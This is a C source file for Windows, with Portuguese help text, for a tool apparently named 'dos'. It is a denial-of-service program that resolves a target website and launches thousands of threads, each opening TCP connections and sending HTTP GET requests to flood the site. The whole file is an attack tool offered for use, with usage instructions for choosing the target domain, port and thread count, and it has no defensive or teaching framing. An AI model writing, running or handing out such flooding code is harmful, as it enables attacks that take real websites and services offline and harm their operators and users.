#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <pthread.h>
#include <time.h>

#define MAXTH 80000

pthread_t threads[MAXTH];

typedef struct sockaddr SADDR;

struct alvo
{
	char *dom;
	char *host;
	int porta;
};
typedef struct alvo PARAMS;

void *attack(void *arg)
{
	WSADATA ws;
	WSAStartup(MAKEWORD(2, 2), &ws);

	PARAMS *av1 = (struct alvo *)arg;

	char *host = (char *)av1->host;
	char *dom = (char *)av1->dom;
	int porta = (int)av1->porta;

	char req[200];
	sprintf(req, "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", dom);
	struct sockaddr_in alvo;

	alvo.sin_addr.s_addr = inet_addr(host);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(porta);

	int sTest;

	if ((sTest = socket(AF_INET, SOCK_STREAM, 0)) >= 0)
	{
		if (connect(sTest, (SADDR *)&alvo, sizeof(alvo)) >= 0)
		{
			int meusocket = socket(AF_INET, SOCK_STREAM, 0);
			int conecta = connect(meusocket, (SADDR *)&alvo, sizeof(alvo));
			send(meusocket, req, sizeof(req), 0);
		}
		else
		{
			printf("Connect Error\n");
		}
	}
	else
	{
		printf("Socket Error\n");
	}
}

int main(int argc, char *argv[])
{
	WSADATA ws;
	WSAStartup(MAKEWORD(2, 2), &ws);

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
	WORD saved_attributes;
	GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
	saved_attributes = consoleInfo.wAttributes;

	int i;
	int k = 0;
	char *arg1 = argv[1];
	char *help = "help";

	if (strcmp(arg1, help) == 0)
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		puts("DNS: voce vai usar somente o dominio do site, sem http. ex: www.google.com.br");
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
		puts("PORT: e a porta por onde o ataque sera realizado, por padrao seria http, 80");
		SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE);
		puts("THREAD_NUMBER: o numero de requisicoes simultaneas que voce quer\n");
		SetConsoleTextAttribute(hConsole, saved_attributes);
		puts("ordem dos argumentos:\n");
		printf("dos ");
		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		printf("DNS ");
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
		printf("PORT ");
		SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE);
		printf("THREAD_NUMBER ");
		SetConsoleTextAttribute(hConsole, saved_attributes);
	}
	else
	{

		PARAMS av;
		struct hostent *h;
		struct in_addr addr;

		h = gethostbyname(argv[1]);
		puts(h->h_name);

		while (h->h_addr_list[k] != 0)
		{
			addr.s_addr = *(unsigned long *)h->h_addr_list[k++];
		}
		puts(inet_ntoa(addr));
		av.host = inet_ntoa(addr);
		av.dom = h->h_name;
		av.porta = atoi(argv[2]);

		int tN = atoi(argv[3]);

		for (i = 0; i < tN; i++)
		{
			pthread_create(&(threads[i]), NULL, attack, &av);
			printf("Threads %d\n", i);
			Sleep(1);
		}

		for (i = 0; i < tN; i++)
		{
			pthread_join(threads[i], NULL);
		}

		return 0;
	}
}
